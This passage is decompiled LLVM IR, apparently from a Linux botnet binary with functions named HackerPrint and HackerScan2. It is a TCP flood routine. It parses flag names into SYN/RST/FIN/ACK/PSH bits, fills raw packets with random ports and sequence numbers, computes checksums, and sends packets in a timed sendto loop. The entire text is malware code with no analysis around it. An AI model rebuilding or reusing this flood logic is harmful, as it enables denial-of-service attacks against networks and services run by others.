  %v0_804e914 = load i32, i32* @eax, align 4
  %v2_804e914 = add i32 %v0_804e90c, -16
  %v3_804e914 = inttoptr i32 %v2_804e914 to i32*
  store i32 %v0_804e914, i32* %v3_804e914, align 4
  %v3_804e915 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805c7ed.858 to i32))
  store i32 %v3_804e915, i32* %eax.global-to-local, align 4
  %v5_804e91d = inttoptr i32 %v3_804e915 to i8*
  store i8* %v5_804e91d, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eacb22 = icmp eq i32 %v3_804e915, 0
  %v1_804eacf29 = icmp eq i1 %v5_804eacb22, false
  br i1 %v1_804eacf29, label %dec_label_pc_804e925.lr.ph, label %dec_label_pc_804ead5

dec_label_pc_804e925.lr.ph:                       ; preds = %dec_label_pc_804e909
  %v1_804ea92 = add i32 %v2_804e80c, 33
  %v2_804ea92 = inttoptr i32 %v1_804ea92 to i8*
  %tmp104 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e925

dec_label_pc_804e925:                             ; preds = %dec_label_pc_804e925.lr.ph, %dec_label_pc_804eab6
  %v3_804eaa5 = phi i8* [ %v5_804e91d, %dec_label_pc_804e925.lr.ph ], [ %tmp105, %dec_label_pc_804eab6 ]
  %stack_var_-156.131 = phi i8* [ %tmp50, %dec_label_pc_804e925.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804eab6 ]
  %stack_var_-160.130 = phi i32 [ %tmp49, %dec_label_pc_804e925.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804eab6 ]
  %v4_804e925 = ptrtoint i8* %v3_804eaa5 to i32
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e925, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c7f3.860 to i32), i32* @edi, align 4
  %v6_804e943 = call i32 @_strncmp(i8* %v3_804eaa5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c7f3.860, i32 0, i32 0), i32 4)
  %v7_804e943 = urem i32 %v6_804e943, 2
  %v8_804e943 = icmp eq i32 %v7_804e943, 0
  %v0_804e945 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e945 = or i1 %v0_804e945, %v8_804e943
  %v3_804e945 = zext i1 %v2_804e945 to i32
  %v4_804e945 = load i32, i32* @edx, align 4
  %v5_804e945 = and i32 %v4_804e945, -256
  %v6_804e945 = or i32 %v3_804e945, %v5_804e945
  %v7_804e945 = xor i32 %v6_804e945, 1
  store i32 %v7_804e945, i32* %edx.global-to-local, align 4
  %v3_804e94b = and i32 %v6_804e943, -256
  %v1_804e94d = trunc i32 %v7_804e945 to i8
  %v3_804e94d = zext i1 %v0_804e945 to i8
  %v4_804e94d = sub nsw i8 %v1_804e94d, %v3_804e94d
  %v15_804e94d = icmp eq i8 %v4_804e94d, 0
  %v20_804e94d = zext i8 %v4_804e94d to i32
  %v23_804e94d = or i32 %v20_804e94d, %v3_804e94b
  store i32 %v23_804e94d, i32* @ecx, align 4
  %v2_804e951 = sext i8 %v4_804e94d to i32
  store i32 %v2_804e951, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e956 = icmp eq i1 %v15_804e94d, false
  br i1 %v1_804e956, label %dec_label_pc_804e969, label %dec_label_pc_804e958

dec_label_pc_804e958:                             ; preds = %dec_label_pc_804e925
  store i32 %v1_804e824, i32* @eax, align 4
  %v3_804e95b = load i8, i8* %v2_804ea92, align 1
  %v4_804e95b = zext i8 %v3_804e95b to i32
  %v7_804e95b = or i32 %v5_804e945, %v4_804e95b
  %v1_804e95e = or i32 %v7_804e95b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e95e = trunc i32 %v1_804e95e to i8
  store i32 %v1_804e95e, i32* @edx, align 4
  store i8 %v3_804e95e, i8* %v2_804ea92, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804e969:                             ; preds = %dec_label_pc_804e925
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e925, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c7f7.861 to i32), i32* @edi, align 4
  %v6_804e987 = call i32 @_strncmp(i8* %v3_804eaa5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c7f7.861, i32 0, i32 0), i32 4)
  %v7_804e987 = urem i32 %v6_804e987, 2
  %v8_804e987 = icmp eq i32 %v7_804e987, 0
  %v0_804e989 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e989 = or i1 %v0_804e989, %v8_804e987
  %v3_804e989 = zext i1 %v2_804e989 to i32
  %v4_804e989 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e989 = and i32 %v4_804e989, -256
  %v6_804e989 = or i32 %v3_804e989, %v5_804e989
  %v7_804e989 = xor i32 %v6_804e989, 1
  store i32 %v7_804e989, i32* %edx.global-to-local, align 4
  %v3_804e98f = and i32 %v6_804e987, -256
  %v1_804e991 = trunc i32 %v7_804e989 to i8
  %v3_804e991 = zext i1 %v0_804e989 to i8
  %v4_804e991 = sub nsw i8 %v1_804e991, %v3_804e991
  %v15_804e991 = icmp eq i8 %v4_804e991, 0
  %v20_804e991 = zext i8 %v4_804e991 to i32
  %v23_804e991 = or i32 %v20_804e991, %v3_804e98f
  store i32 %v23_804e991, i32* @ecx, align 4
  %v2_804e995 = sext i8 %v4_804e991 to i32
  store i32 %v2_804e995, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e99a = icmp eq i1 %v15_804e991, false
  br i1 %v1_804e99a, label %dec_label_pc_804e9ad, label %dec_label_pc_804e99c

dec_label_pc_804e99c:                             ; preds = %dec_label_pc_804e969
  store i32 %v1_804e824, i32* @eax, align 4
  %v3_804e99f = load i8, i8* %v2_804ea92, align 1
  %v4_804e99f = zext i8 %v3_804e99f to i32
  %v7_804e99f = or i32 %v5_804e989, %v4_804e99f
  %v1_804e9a2 = or i32 %v7_804e99f, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e9a2 = trunc i32 %v1_804e9a2 to i8
  store i32 %v1_804e9a2, i32* @edx, align 4
  store i8 %v3_804e9a2, i8* %v2_804ea92, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e969
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e925, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c7fb.862 to i32), i32* @edi, align 4
  %v6_804e9d1 = call i32 @_strncmp(i8* %v3_804eaa5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c7fb.862, i32 0, i32 0), i32 4)
  %v7_804e9d1 = urem i32 %v6_804e9d1, 2
  %v8_804e9d1 = icmp eq i32 %v7_804e9d1, 0
  %v0_804e9d3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9d3 = or i1 %v0_804e9d3, %v8_804e9d1
  %v3_804e9d3 = zext i1 %v2_804e9d3 to i32
  %v4_804e9d3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9d3 = and i32 %v4_804e9d3, -256
  %v6_804e9d3 = or i32 %v3_804e9d3, %v5_804e9d3
  %v7_804e9d3 = xor i32 %v6_804e9d3, 1
  store i32 %v7_804e9d3, i32* %edx.global-to-local, align 4
  %v3_804e9d9 = and i32 %v6_804e9d1, -256
  %v1_804e9db = trunc i32 %v7_804e9d3 to i8
  %v3_804e9db = zext i1 %v0_804e9d3 to i8
  %v4_804e9db = sub nsw i8 %v1_804e9db, %v3_804e9db
  %v15_804e9db = icmp eq i8 %v4_804e9db, 0
  %v20_804e9db = zext i8 %v4_804e9db to i32
  %v23_804e9db = or i32 %v20_804e9db, %v3_804e9d9
  store i32 %v23_804e9db, i32* @ecx, align 4
  %v2_804e9df = sext i8 %v4_804e9db to i32
  store i32 %v2_804e9df, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9e4 = icmp eq i1 %v15_804e9db, false
  br i1 %v1_804e9e4, label %dec_label_pc_804e9f7, label %dec_label_pc_804e9e6

dec_label_pc_804e9e6:                             ; preds = %dec_label_pc_804e9ad
  store i32 %v1_804e824, i32* @eax, align 4
  %v3_804e9e9 = load i8, i8* %v2_804ea92, align 1
  %v4_804e9e9 = zext i8 %v3_804e9e9 to i32
  %v7_804e9e9 = or i32 %v5_804e9d3, %v4_804e9e9
  %v1_804e9ec = or i32 %v7_804e9e9, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e9ec = trunc i32 %v1_804e9ec to i8
  store i32 %v1_804e9ec, i32* @edx, align 4
  store i8 %v3_804e9ec, i8* %v2_804ea92, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804e9f7:                             ; preds = %dec_label_pc_804e9ad
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e925, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c7ff.863 to i32), i32* @edi, align 4
  %v6_804ea27 = call i32 @_strncmp(i8* %v3_804eaa5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c7ff.863, i32 0, i32 0), i32 4)
  %v7_804ea27 = urem i32 %v6_804ea27, 2
  %v8_804ea27 = icmp eq i32 %v7_804ea27, 0
  %v0_804ea29 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea29 = or i1 %v0_804ea29, %v8_804ea27
  %v3_804ea29 = zext i1 %v2_804ea29 to i32
  %v4_804ea29 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea29 = and i32 %v4_804ea29, -256
  %v6_804ea29 = or i32 %v3_804ea29, %v5_804ea29
  %v7_804ea29 = xor i32 %v6_804ea29, 1
  store i32 %v7_804ea29, i32* %edx.global-to-local, align 4
  %v3_804ea2f = and i32 %v6_804ea27, -256
  %v1_804ea31 = trunc i32 %v7_804ea29 to i8
  %v3_804ea31 = zext i1 %v0_804ea29 to i8
  %v4_804ea31 = sub nsw i8 %v1_804ea31, %v3_804ea31
  %v15_804ea31 = icmp eq i8 %v4_804ea31, 0
  %v20_804ea31 = zext i8 %v4_804ea31 to i32
  %v23_804ea31 = or i32 %v20_804ea31, %v3_804ea2f
  store i32 %v23_804ea31, i32* @ecx, align 4
  %v2_804ea35 = sext i8 %v4_804ea31 to i32
  store i32 %v2_804ea35, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea3a = icmp eq i1 %v15_804ea31, false
  br i1 %v1_804ea3a, label %dec_label_pc_804ea4a, label %dec_label_pc_804ea3c

dec_label_pc_804ea3c:                             ; preds = %dec_label_pc_804e9f7
  store i32 %v1_804e824, i32* @eax, align 4
  %v3_804ea3f = load i8, i8* %v2_804ea92, align 1
  %v4_804ea3f = zext i8 %v3_804ea3f to i32
  %v7_804ea3f = or i32 %v5_804ea29, %v4_804ea3f
  %v1_804ea42 = or i32 %v7_804ea3f, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ea42 = trunc i32 %v1_804ea42 to i8
  store i32 %v1_804ea42, i32* @edx, align 4
  store i8 %v3_804ea42, i8* %v2_804ea92, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804ea4a:                             ; preds = %dec_label_pc_804e9f7
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e925, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c803.864 to i32), i32* @edi, align 4
  %v6_804ea7a = call i32 @_strncmp(i8* %v3_804eaa5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c803.864, i32 0, i32 0), i32 4)
  %v7_804ea7a = urem i32 %v6_804ea7a, 2
  %v8_804ea7a = icmp eq i32 %v7_804ea7a, 0
  %v0_804ea7c = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea7c = or i1 %v0_804ea7c, %v8_804ea7a
  %v3_804ea7c = zext i1 %v2_804ea7c to i32
  %v4_804ea7c = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea7c = and i32 %v4_804ea7c, -256
  %v6_804ea7c = or i32 %v3_804ea7c, %v5_804ea7c
  %v7_804ea7c = xor i32 %v6_804ea7c, 1
  store i32 %v7_804ea7c, i32* %edx.global-to-local, align 4
  %v3_804ea82 = and i32 %v6_804ea7a, -256
  %v1_804ea84 = trunc i32 %v7_804ea7c to i8
  %v3_804ea84 = zext i1 %v0_804ea7c to i8
  %v4_804ea84 = sub nsw i8 %v1_804ea84, %v3_804ea84
  %v15_804ea84 = icmp eq i8 %v4_804ea84, 0
  %v20_804ea84 = zext i8 %v4_804ea84 to i32
  %v23_804ea84 = or i32 %v20_804ea84, %v3_804ea82
  store i32 %v23_804ea84, i32* @ecx, align 4
  %v2_804ea88 = sext i8 %v4_804ea84 to i32
  store i32 %v2_804ea88, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea8d = icmp eq i1 %v15_804ea84, false
  br i1 %v1_804ea8d, label %dec_label_pc_804ea9d, label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea4a
  store i32 %v1_804e824, i32* @eax, align 4
  %v3_804ea92 = load i8, i8* %v2_804ea92, align 1
  %v4_804ea92 = zext i8 %v3_804ea92 to i32
  %v7_804ea92 = or i32 %v5_804ea7c, %v4_804ea92
  %v1_804ea95 = or i32 %v7_804ea92, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ea95 = trunc i32 %v1_804ea95 to i8
  store i32 %v1_804ea95, i32* @edx, align 4
  store i8 %v3_804ea95, i8* %v2_804ea92, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804ea9d:                             ; preds = %dec_label_pc_804ea4a
  %v0_804ea9d = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804ea9d, i32* %eax.global-to-local, align 4
  %v0_804eaa2 = load i32, i32* @esp, align 4
  %v5_804eaa2 = icmp ult i32 %v0_804eaa2, 4
  store i1 %v5_804eaa2, i1* %cf.global-to-local, align 1
  %v6_804eaa5 = add i32 %v0_804eaa2, -8
  %v7_804eaa5 = inttoptr i32 %v6_804eaa5 to i32*
  store i32 %v4_804e925, i32* %v7_804eaa5, align 4
  %v1_804eaa8 = add i32 %v0_804eaa2, -12
  %v2_804eaa8 = inttoptr i32 %v1_804eaa8 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_805c807.865 to i32), i32* %v2_804eaa8, align 4
  %v0_804eaad = load i32, i32* %eax.global-to-local, align 4
  %v2_804eaad = add i32 %v0_804eaa2, -16
  %v3_804eaad = inttoptr i32 %v2_804eaad to i32*
  store i32 %v0_804eaad, i32* %v3_804eaad, align 4
  %v3_804eaae = call i32 @HackerPrint(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805c803.864 to i32))
  store i32 %v3_804eaae, i32* @eax, align 4
  %v0_804eab3 = load i32, i32* @esp, align 4
  %v2_804eab3 = icmp ugt i32 %v0_804eab3, -17
  store i1 %v2_804eab3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eab6

dec_label_pc_804eab6:                             ; preds = %dec_label_pc_804ea8f, %dec_label_pc_804ea3c, %dec_label_pc_804e9e6, %dec_label_pc_804e99c, %dec_label_pc_804e958, %dec_label_pc_804ea9d
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804ea9d ], [ 4, %dec_label_pc_804ea8f ], [ %stack_var_-160.130, %dec_label_pc_804ea3c ], [ %stack_var_-160.130, %dec_label_pc_804e9e6 ], [ %stack_var_-160.130, %dec_label_pc_804e99c ], [ %stack_var_-160.130, %dec_label_pc_804e958 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c803.864, i32 0, i32 0), %dec_label_pc_804ea9d ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c803.864, i32 0, i32 0), %dec_label_pc_804ea8f ], [ %stack_var_-156.131, %dec_label_pc_804ea3c ], [ %stack_var_-156.131, %dec_label_pc_804e9e6 ], [ %stack_var_-156.131, %dec_label_pc_804e99c ], [ %stack_var_-156.131, %dec_label_pc_804e958 ]
  %v0_804eab6 = load i32, i32* @esp, align 4
  %v5_804eab6 = icmp ult i32 %v0_804eab6, 8
  store i1 %v5_804eab6, i1* %cf.global-to-local, align 1
  %v1_804eab9 = add i32 %v0_804eab6, -12
  %v2_804eab9 = inttoptr i32 %v1_804eab9 to i32*
  store i32 ptrtoint (i32* @global_var_805c7f1.859 to i32), i32* %v2_804eab9, align 4
  %v1_804eabe = add i32 %v0_804eab6, -16
  %v2_804eabe = inttoptr i32 %v1_804eabe to i32*
  store i32 0, i32* %v2_804eabe, align 4
  %v2_804eac0 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804eac0 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804eac0)
  store i32 %v3_804eac0, i32* %eax.global-to-local, align 4
  store i32 %v3_804eac0, i32* %tmp104, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eacb = icmp eq i32 %v3_804eac0, 0
  %v1_804eacf = icmp eq i1 %v5_804eacb, false
  %tmp105 = inttoptr i32 %v3_804eac0 to i8*
  br i1 %v1_804eacf, label %dec_label_pc_804e925, label %dec_label_pc_804ead5

dec_label_pc_804ead5:                             ; preds = %dec_label_pc_804eab6, %dec_label_pc_804e909, %dec_label_pc_804e8c8
  %v0_804ead5 = phi i8* [ %v0_804ead5.pre, %dec_label_pc_804e8c8 ], [ %v5_804e91d, %dec_label_pc_804e909 ], [ %tmp105, %dec_label_pc_804eab6 ]
  %v1_804ead5 = ptrtoint i8* %v0_804ead5 to i32
  %v2_804ead5 = call i32 @rand_cmwc(i32 %v1_804ead5)
  %sext9 = mul i32 %v2_804ead5, 65536
  %v1_804eada = sdiv i32 %sext9, 65536
  store i32 %v1_804eada, i32* %edx.global-to-local, align 4
  %v1_804eadf = trunc i32 %v1_804eada to i16
  %v3_804eadf = add i32 %v2_804e80c, 34
  %v4_804eadf = inttoptr i32 %v3_804eadf to i16*
  store i16 %v1_804eadf, i16* %v4_804eadf, align 2
  %v1_804eae6 = add i32 %v2_804e80c, 36
  %v2_804eae6 = inttoptr i32 %v1_804eae6 to i16*
  store i16 0, i16* %v2_804eae6, align 4
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v1_804eaef = add i32 %v2_804e80c, 38
  %v2_804eaef = inttoptr i32 %v1_804eaef to i16*
  store i16 0, i16* %v2_804eaef, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804e6fb, label %dec_label_pc_804eb06, label %dec_label_pc_804eafb

dec_label_pc_804eafb:                             ; preds = %dec_label_pc_804ead5
  %v0_804eafb = load i8*, i8** %stack_var_-20, align 4
  %v1_804eafb = ptrtoint i8* %v0_804eafb to i32
  %v2_804eafb = call i32 @rand_cmwc(i32 %v1_804eafb)
  store i32 %v2_804eafb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb1e

dec_label_pc_804eb06:                             ; preds = %dec_label_pc_804ead5
  %v1_804eb09 = urem i32 %arg2, 65536
  store i32 %v1_804eb09, i32* %eax.global-to-local, align 4
  %v0_804eb0e = load i32, i32* @esp, align 4
  %v5_804eb0e = icmp ult i32 %v0_804eb0e, 12
  store i1 %v5_804eb0e, i1* %cf.global-to-local, align 1
  %v2_804eb11 = add i32 %v0_804eb0e, -16
  %v3_804eb11 = inttoptr i32 %v2_804eb11 to i32*
  store i32 %v1_804eb09, i32* %v3_804eb11, align 4
  %v1_804eb12 = sext i16 %tmp48 to i32
  %v2_804eb12 = call i32 @htons(i32 %v1_804eb12)
  store i32 %v2_804eb12, i32* %eax.global-to-local, align 4
  %v0_804eb17 = load i32, i32* @esp, align 4
  %v2_804eb17 = icmp ugt i32 %v0_804eb17, -17
  store i1 %v2_804eb17, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb1e

dec_label_pc_804eb1e:                             ; preds = %dec_label_pc_804eafb, %dec_label_pc_804eb06
  %storemerge.in = phi i32 [ %v2_804eb12, %dec_label_pc_804eb06 ], [ %v2_804eafb, %dec_label_pc_804eafb ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  %v4_804eb21 = urem i32 %storemerge.in, 65536
  %v5_804eb21 = load i32, i32* @esi, align 4
  %v6_804eb21 = and i32 %v5_804eb21, -65536
  %v7_804eb21 = or i32 %v6_804eb21, %v4_804eb21
  store i32 %v7_804eb21, i32* @esi, align 4
  %v3_804eb25 = add i32 %v2_804e80c, 22
  %v4_804eb25 = inttoptr i32 %v3_804eb25 to i16*
  store i16 %storemerge, i16* %v4_804eb25, align 2
  %v0_804eb29 = load i32, i32* @esp, align 4
  %v5_804eb29 = icmp ult i32 %v0_804eb29, 8
  store i1 %v5_804eb29, i1* %cf.global-to-local, align 1
  %v6_804eb2c = add i32 %v0_804eb29, -12
  %v7_804eb2c = inttoptr i32 %v6_804eb2c to i32*
  store i32 %v1_804e824, i32* %v7_804eb2c, align 4
  %v5_804eb2f = add i32 %v0_804eb29, -16
  %v6_804eb2f = inttoptr i32 %v5_804eb2f to i32*
  store i32 %v2_804e80c, i32* %v6_804eb2f, align 4
  %v0_804eb32 = call i32 @tcpcsum()
  %v1_804eb32 = trunc i32 %v0_804eb32 to i16
  %sext14 = mul i32 %v0_804eb32, 65536
  %v1_804eb3a = sdiv i32 %sext14, 65536
  store i32 %v1_804eb3a, i32* %edx.global-to-local, align 4
  store i16 %v1_804eb32, i16* %v2_804eae6, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v1_804eb46 = or i32 %v2_804e80c, 2
  %v2_804eb46 = inttoptr i32 %v1_804eb46 to i16*
  %v3_804eb46 = load i16, i16* %v2_804eb46, align 2
  %v4_804eb46 = zext i16 %v3_804eb46 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804eb46, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v1_804eb55 = load i32, i32* @esp, align 4
  %v2_804eb55 = add i32 %v1_804eb55, -4
  %v3_804eb55 = inttoptr i32 %v2_804eb55 to i32*
  store i32 %v4_804eb46, i32* %v3_804eb55, align 4
  %v0_804eb56 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb56 = add i32 %v1_804eb55, -8
  %v3_804eb56 = inttoptr i32 %v2_804eb56 to i32*
  store i32 %v0_804eb56, i32* %v3_804eb56, align 4
  %sext15 = mul i32 %storemerge.in, 65536
  %v1_804eb57 = sdiv i32 %sext15, 65536
  %v3_804eb57 = inttoptr i32 %v1_804eb57 to i16*
  %v4_804eb57 = call i32 @csum(i16* %v3_804eb57, i32 ptrtoint (i32* @0 to i32))
  %v5_804eb57 = trunc i32 %v4_804eb57 to i16
  %sext16 = mul i32 %v4_804eb57, 65536
  %v1_804eb5f = sdiv i32 %sext16, 65536
  store i32 %v1_804eb5f, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v3_804eb64 = or i32 %v2_804e80c, 10
  %v4_804eb64 = inttoptr i32 %v3_804eb64 to i16*
  store i16 %v5_804eb57, i16* %v4_804eb64, align 2
  %v0_804eb68 = load i32, i32* @esp, align 4
  %v5_804eb68 = icmp ult i32 %v0_804eb68, 12
  store i1 %v5_804eb68, i1* %cf.global-to-local, align 1
  %v1_804eb6b = add i32 %v0_804eb68, -16
  %v2_804eb6b = inttoptr i32 %v1_804eb6b to i32*
  store i32 0, i32* %v2_804eb6b, align 4
  %v2_804eb6d = inttoptr i32 %v1_804eb57 to i32*
  %v3_804eb6d = call i32 @__GI_time(i32* %v2_804eb6d)
  %v0_804eb72 = load i32, i32* @esp, align 4
  %v1_804eb72 = add i32 %v0_804eb72, 16
  %v5_804eb75 = add i32 %v3_804eb6d, %arg3
  %v10_804eb75 = icmp ult i32 %v5_804eb75, %v3_804eb6d
  store i1 %v10_804eb75, i1* %cf.global-to-local, align 1
  store i32 %v5_804eb75, i32* %eax.global-to-local, align 4
  %v2_804ebc0 = or i32 %v2_804e80c, 12
  %v3_804ebc0 = inttoptr i32 %v2_804ebc0 to i32*
  %v3_804ebcd = or i32 %v2_804e80c, 4
  %v4_804ebcd = inttoptr i32 %v3_804ebcd to i16*
  br label %dec_label_pc_804eb84

dec_label_pc_804eb84:                             ; preds = %dec_label_pc_804ec3b, %dec_label_pc_804ec59, %dec_label_pc_804eb1e
  %v0_804eb8a = phi i32 [ %v1_804eb72, %dec_label_pc_804eb1e ], [ %v0_804eb8a.pre.pre, %dec_label_pc_804ec59 ], [ %v1_804ec45, %dec_label_pc_804ec3b ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804eb1e ], [ %v4_804ec59, %dec_label_pc_804ec59 ], [ 0, %dec_label_pc_804ec3b ]
  store i32 %v2_804e723, i32* %eax.global-to-local, align 4
  store i32 %v2_804e80c, i32* %edx.global-to-local, align 4
  %v5_804eb8a = icmp ult i32 %v0_804eb8a, 8
  store i1 %v5_804eb8a, i1* %cf.global-to-local, align 1
  %v1_804eb8d = add i32 %v0_804eb8a, -12
  %v2_804eb8d = inttoptr i32 %v1_804eb8d to i32*
  store i32 16, i32* %v2_804eb8d, align 4
  %v2_804eb8f = add i32 %v0_804eb8a, -16
  %v3_804eb8f = inttoptr i32 %v2_804eb8f to i32*
  store i32 %v2_804e723, i32* %v3_804eb8f, align 4
  %v1_804eb90 = add i32 %v0_804eb8a, -20
  %v2_804eb90 = inttoptr i32 %v1_804eb90 to i32*
  store i32 0, i32* %v2_804eb90, align 4
  %v5_804eb92 = add i32 %v0_804eb8a, -24
  %v6_804eb92 = inttoptr i32 %v5_804eb92 to i32*
  store i32 %v1_804e7ec, i32* %v6_804eb92, align 4
  %v0_804eb95 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eb95 = add i32 %v0_804eb8a, -28
  %v3_804eb95 = inttoptr i32 %v2_804eb95 to i32*
  store i32 %v0_804eb95, i32* %v3_804eb95, align 4
  %v5_804eb96 = add i32 %v0_804eb8a, -32
  %v6_804eb96 = inttoptr i32 %v5_804eb96 to i32*
  store i32 %v4_804e75a, i32* %v6_804eb96, align 4
  %v1_804eb99 = load i32, i32* %stack_var_-64, align 4
  %v2_804eb99 = load i32, i32* %stack_var_-60, align 4
  %v3_804eb99 = load i32, i32* %stack_var_-56, align 4
  %v4_804eb99 = load i32, i32* %stack_var_-52, align 4
  %v6_804eb99 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804eb99, i32 %v2_804eb99, i32 %v3_804eb99, i32 %v4_804eb99, i32 0)
  store i32 %v6_804eb99, i32* @eax, align 4
  %v0_804eb9e = load i32, i32* @esp, align 4
  %v1_804eb9e = add i32 %v0_804eb9e, 32
  %v5_804eba1 = icmp ult i32 %v1_804eb9e, 12
  store i1 %v5_804eba1, i1* %cf.global-to-local, align 1
  %v5_804eba4 = add i32 %v0_804eb9e, 16
  %v6_804eba4 = inttoptr i32 %v5_804eba4 to i32*
  store i32 %storemerge13, i32* %v6_804eba4, align 4
  %v1_804eba7 = call i32 @HackerScan2(i32 %stack_var_-68.0)
  store i32 %v1_804eba7, i32* %eax.global-to-local, align 4
  %v0_804ebac = load i32, i32* @esp, align 4
  %v1_804ebac = add i32 %v0_804ebac, 16
  %v5_804ebaf = icmp ult i32 %v1_804ebac, 12
  store i1 %v5_804ebaf, i1* %cf.global-to-local, align 1
  %v3_804ebb2 = inttoptr i32 %v0_804ebac to i32*
  store i32 %v1_804eba7, i32* %v3_804ebb2, align 4
  %v0_804ebb3 = call i32 @htonl()
  %v0_804ebb8 = load i32, i32* @esp, align 4
  %v2_804ebb8 = icmp ugt i32 %v0_804ebb8, -17
  store i1 %v2_804ebb8, i1* %cf.global-to-local, align 1
  store i32 %v0_804ebb3, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  store i32 %v0_804ebb3, i32* %v3_804ebc0, align 4
  %v1_804ebc3 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804ebc3, 65536
  %v1_804ebc8 = sdiv i32 %sext10, 65536
  store i32 %v1_804ebc8, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v1_804ebcd = trunc i32 %v1_804ebc8 to i16
  store i16 %v1_804ebcd, i16* %v4_804ebcd, align 4
  %v1_804ebd1 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804ebd1, i32* %edx.global-to-local, align 4
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebd1, i32* %v3_804e879, align 8
  %v1_804ebde = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext11 = mul i32 %v1_804ebde, 65536
  %v1_804ebe3 = sdiv i32 %sext11, 65536
  store i32 %v1_804ebe3, i32* %edx.global-to-local, align 4
  %v1_804ebe8 = trunc i32 %v1_804ebe3 to i16
  store i16 %v1_804ebe8, i16* %v5_804e827, align 4
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804eae6, align 4
  %v0_804ebf4 = load i32, i32* @esp, align 4
  %v5_804ebf4 = icmp ult i32 %v0_804ebf4, 8
  store i1 %v5_804ebf4, i1* %cf.global-to-local, align 1
